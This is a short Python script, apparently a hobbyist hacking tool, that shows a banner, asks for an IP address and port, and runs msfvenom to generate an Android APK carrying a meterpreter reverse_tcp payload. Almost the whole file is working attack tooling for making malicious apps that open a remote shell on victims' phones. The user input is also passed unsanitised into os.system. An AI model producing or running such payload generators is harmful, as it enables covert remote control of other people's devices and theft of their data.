import os
from termcolor import colored


print()
print()
print(colored('                    #######\n                    ##     ##\n                    ##       #\n                    ##        #\n                    ##       #\n                    ##     ##\n                    #######\n                    ##\n                    ##\n                    ##\n                    ##\n                    ##', 'yellow'))
print('')
print('')

ip = input('Enter the ip address to use for payload: ')
port = input('Enter the port no. to use for payload: ')
pathpayload = 'generated/payload.apk'
exit_status = ''

confirm = input('Did you specify the correct information and want to continue? [y,n]')
if confirm=='y' or confirm=='Y':
    print(colored('Generating payload apk...','green'))
    try:
        os.system(f'msfvenom -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o {pathpayload}')
        print(colored('Generated payload apk', 'green'))
    except Exception as e:
        print(colored(e, 'red'))
else:
    print()
    print(colored('Abort.','red'))
    print()